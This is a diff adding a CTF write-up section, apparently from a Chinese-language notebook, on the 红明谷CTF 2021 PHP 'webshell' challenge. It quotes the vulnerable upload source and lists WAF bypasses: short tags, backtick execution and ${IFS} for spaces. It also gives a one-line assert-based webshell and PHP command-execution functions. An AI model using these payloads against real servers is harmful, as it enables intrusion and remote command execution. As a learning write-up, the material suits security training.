@@ -3344,3 +3344,100 @@ url解码之后就是 `?code=phpinfo();`
     得到payload后，利用bp修改become的值为payload
 
     *注意 : 每次发送请求都要将jwt中的username改为admin*
+
+## 红明谷CTF 2021 webshell(php系统命令执行)
+
+1. 源码
+
+    ```php
+    <?php
+    error_reporting(0);
+    highlight_file(__FILE__);
+    function check($input){
+        if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
+            // if(preg_match("/'| |_|=|php/",$input)){
+            die('hacker!!!');
+        }else{
+            return $input;
+        }
+    }
+
+    function waf($input){
+    if(is_array($input)){
+        foreach($input as $key=>$output){
+            $input[$key] = waf($output);
+        }
+    }else{
+        $input = check($input);
+    }
+    }
+
+    $dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+    if(!file_exists($dir)){
+        mkdir($dir);
+    }
+    switch($_GET["action"] ?? "") {
+        case 'pwd':
+            echo $dir;
+            break;
+        case 'upload':
+            $data = $_GET["data"] ?? "";
+            waf($data);
+            file_put_contents("$dir" . "index.php", $data);
+    }
+    ?>
+    ```
+
+    重点是这句代码,会将参数中的内容写入文件
+
+    ```php
+    file_put_contents("$dir" . "index.php", $data);
+    ```
+
+    但是过滤了空格，`'`,`;`,`php`,`eval`,`_`
+
+2. 一开始看到以为是传木马用蚁剑连接，试了好几次没成功，后来才发现不是，其实就是简单的命令执行。`_`被过滤，所以用不了木马
+
+3. 过滤绕过
+
+    ```php
+    'php'：导致'<?php ?>'不能用，可以用短标签 ‘<?= ?>’ 绕过
+
+    'eval':可以用反引号(``)替换,php会尝试将反引号中的内容当作系统shell执行
+
+    ' ':空格被过滤，linux系统中可以用'${IFS}'绕过
+
+    像'php','eval'这些被过滤，也可以用'.'连接进行绕过,如'p.hp','e.val'等
+
+    如果一句话木马可用('_'没有被过滤)，assert和eval可以互换，如：
+    <?php
+    @assert($_GET["cmd"]);
+    ?>
+    
+    php执行系统命令：
+    //shell_exec函数可执行但需要加echo才能显示结果
+    shell_exec("ls")
+
+    //system函数可执行并直接显示结果
+    system("ls")
+
+    //function exec(命令，以数组形式的保存结果，命令执行的状态码)
+    //可执行，但需要加echo才能显示结果;
+    //单执行exec的话只会显示结果最后一行，下方两个命令组合执行便可以显示所有结果
+    exec("ls",$a)
+    print_r($a)
+
+    //passthru函数可执行并直接显示结果
+    passthru("ls")
+
+    //popen函数：打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。
+    //返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）
+    //此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。
+    //若出错，则返回 false。
+    popen("ls")
+    //popen 用法
+    printf(fread(popen("ls%09/","r"),1024))
+
+    proc_open()
+    `ls`
+    ```
